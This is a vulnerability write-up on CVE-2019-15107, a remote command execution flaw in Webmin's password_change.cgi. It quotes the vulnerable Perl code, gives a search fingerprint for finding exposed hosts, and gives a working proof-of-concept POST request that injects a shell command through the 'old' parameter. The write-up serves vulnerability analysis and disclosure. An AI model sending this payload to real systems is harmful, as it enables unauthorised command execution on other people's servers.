# Webmin password_change.cgi remote command execution vulnerability CVE-2019-15107

## Vulnerability Description

Webmin is a management configuration tool for managing Unix systems, with web pages. 

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Webmin <= 1.920</span>

## Network surveying and mapping

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">app="webmin"</span>

## Vulnerability reappears

Login page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1661479903495-110cfdb8-0a65-4ffb-8779-62b388a34563.png)

The trigger point of the vulnerability is the file password_change.cgi

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1661568713515-5009d2d4-80a9-49b0-ab9b-f098bff322c4.png)

Among them, several parameters of the accepted POST parameter are `user pam expired old new1 new2`, and the most noteworthy parameter is old, and the corresponding code snippet has vulnerabilities.

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1661568802728-3a2a2afb-8b16-47f9-9fb1-e83c6854ee94.png)

```php
if ($wuser) {
	# Update Webmin user's password
	$enc = &acl::encrypt_password($in{'old'}, $wuser->{'pass'});
	$enc eq $wuser->{'pass'} || &pass_error($text{'password_eold'},qx/$in{'old'}/);
	$perr = &acl::check_password_restrictions($in{'user'}, $in{'new1'});
	$perr && &pass_error(&text('password_enewpass', $perr));
	$wuser->{'pass'} = &acl::encrypt_password($in{'new1'});
	$wuser->{'temppass'} = 0;
	&acl::modify_user($wuser->{'name'}, $wuser);
	&reload_miniserv();
	}
```

In perl, `qx/id/` corresponds to the execution of the system command id, and the old parameter in the controllable parameters is controllable, causing the command to be executed and echoed to the page through pass_error to verify the POC

```php
POST /password_change.cgi

user=rootxx&pam=&expired=2&old=test|id&new1=test2&new2=test2
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1661480163002-a6dc7596-7d8a-4f8f-9b76-da1caa8b1b75.png)